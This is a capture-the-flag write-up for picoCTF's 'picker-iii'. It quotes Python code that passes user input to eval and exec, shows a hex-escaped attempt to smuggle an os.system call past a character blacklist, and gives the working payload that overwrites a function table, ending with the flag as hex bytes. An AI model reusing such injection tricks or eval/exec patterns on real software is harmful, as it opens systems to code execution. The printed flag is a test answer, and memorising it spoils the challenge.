# picker-iii

This challenge was really cool. It was a good combination of conceptualizing the application and working on your brains processing power. I'll explain what I mean.

We're given a CLI tool where we are able to read and write to variables as well as call hard-coded functions. The driver function being:

```python
def call_func(n):
  """
  Calls the nth function in the function table.
  Arguments:
    n: The function to call. The first function is 0.
  """

  # Check table for viability
  if( not check_table() ):
    print(CORRUPT_MESSAGE)
    return

  # Check n
  if( n < 0 ): # XXX filter for n
    print('n cannot be less than 0. Aborting...')
    return
  elif( n >= FUNC_TABLE_SIZE ):
    print('n cannot be greater than or equal to the function table size of '+FUNC_TABLE_SIZE)
    return

  # Get function name from table
  func_name = get_func(n)

  # Run the function
  eval(func_name+'()') # XXX vulnerable API
```

Where we want to get eval to execute with `win`. However, the set of options are hardcoded. Fortunately we are provided with the following functions:

```python
def read_variable():
  var_name = input('Please enter variable name to read: ')
  if( filter_var_name(var_name) ):
    eval('print('+var_name+')') # XXX vulnerable API eval
  else:
    print('Illegal variable name')

def filter_value(value):
  if ';' in value or '(' in value or ')' in value: # XXX blacklist 
    return False
  else:
    return True

def write_variable():
  var_name = input('Please enter variable name to write: ')
  if( filter_var_name(var_name) ):
    value = input('Please enter new value of variable: ')
    if( filter_value(value) ):
      exec('global '+var_name+'; '+var_name+' = '+value) # XXX vulnerable exec API
    else:
      print('Illegal value')
  else:
    print('Illegal variable name')
```

We can overwrite the `func_table` variable. However, there is a filter for both `var_name` and `value` which prevent us from getting an Python3 escape. You can actually bypass these filters using hexadecimal like: ` __import__\x28'os'\x29.system\x28'ls'\x29` but you have to pass the value as a string and I couldn't get code execution. 

Ok, lets just overwrite `func_table` with `win`. Lets see how the `func_table` is being parsed:

```python
  func_table = \
'''\
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
'''

def check_table():
  global func_table

  if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE): # XXX constraint 32 * 4 = 128
    return False

  return True


def get_func(n):
  global func_table

  # Check table for viability
  if( not check_table() ):
    print(CORRUPT_MESSAGE)
    return

  # Get function name from table
  func_name = ''
  func_name_offset = n * FUNC_TABLE_ENTRY_SIZE # XXX negative number can cause weird behavior
  for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE):
    if( func_table[i] == ' '):
      func_name = func_table[func_name_offset:i]
      break

  if( func_name == '' ):
    func_name = func_table[func_name_offset:func_name_offset+FUNC_TABLE_ENTRY_SIZE]
  
  return func_name
```

To summarize, `get_func` is iterating over the `func_table` in 32-byte chunks (so 0-31, 32-63, etc...). However, `func_table` has a size which must be met (32 * 4 = 128). That's find actually. The loop which parses `func_table` actually ends early if it encounters a blank space. 

I wrote the following function which generatees the table:

```python
def create_payload():
    """
    Creates payload to win
    """
    target_function = "win"
    required_size = 128

    payload = '"'
    payload += target_function
    payload += (required_size - len(target_function)) * " "
    payload += '"'
    print(payload)
```

This creates: `"win                                                                                                                             "`. Performing the following actions:

```
nc saturn.picoctf.net 58648
==> 3
Please enter variable name to write: func_table
Please enter new value of variable: "win                                                                                                                             "
==> 1
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x63 0x32 0x30 0x66 0x35 0x32 0x32 0x32 0x7d 
==>
```

Decoding the bytes gets the flag.